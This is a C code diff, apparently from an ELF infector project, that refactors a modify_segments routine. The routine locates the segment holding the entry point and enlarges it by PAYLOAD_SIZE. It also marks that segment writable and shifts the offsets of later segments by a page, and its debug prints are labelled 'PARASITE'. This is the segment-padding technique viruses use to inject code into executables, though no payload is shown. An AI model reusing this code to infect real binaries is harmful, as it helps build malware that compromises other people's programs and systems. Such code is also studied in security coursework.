@@ -16,11 +16,6 @@ static inline Elf64_Phdr *get_segment(t_elf const *elf, Elf64_Ehdr const *header
 	return segment;
 }
 
-static inline void modify_segment(Elf64_Phdr *segment)
-{
-	segment->p_offset += PAGE_SIZE;
-}
-
 static inline bool is_entrypoint_segment(Elf64_Ehdr const *header, Elf64_Phdr const *segment)
 {
 	if (header->e_entry < segment->p_vaddr)
@@ -29,20 +24,6 @@ static inline bool is_entrypoint_segment(Elf64_Ehdr const *header, Elf64_Phdr co
 		return false;
 
 	return true;
-}
-
-static inline void modify_elf(t_elf *elf, Elf64_Phdr const *segment)
-{
-	elf->segment_offset = segment->p_offset;
-	elf->segment_addr = segment->p_vaddr;
-	elf->segment_size = segment->p_filesz;
-}
-
-static inline void modify_entrypoint_segment(Elf64_Phdr *segment)
-{
-	segment->p_filesz += PAYLOAD_SIZE;
-	segment->p_memsz += PAYLOAD_SIZE;
-	segment->p_flags |= PF_W;
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -60,14 +41,20 @@ void modify_segments(t_elf *elf)
 		segment = get_segment(elf, header, index);
 
 		if (corrupt == true)
-			modify_segment(segment);
+			segment->p_offset += PAGE_SIZE;
 
 		if (is_entrypoint_segment(header, segment) == true)
 		{
 			printf("PARASITE beg segment at offset: %lx\n", segment->p_offset); // DEBUG
 			printf("PARASITE eng segment at offset: %lx\n", segment->p_offset + segment->p_filesz); // DEBUG
-			modify_elf(elf, segment);
-			modify_entrypoint_segment(segment);
+			
+			elf->segment_offset = segment->p_offset;
+			elf->segment_addr = segment->p_vaddr;
+			elf->segment_size = segment->p_filesz;
+			
+			segment->p_filesz += PAYLOAD_SIZE;
+			segment->p_memsz += PAYLOAD_SIZE;
+			segment->p_flags |= PF_W;
 
 			corrupt = true;
 		}
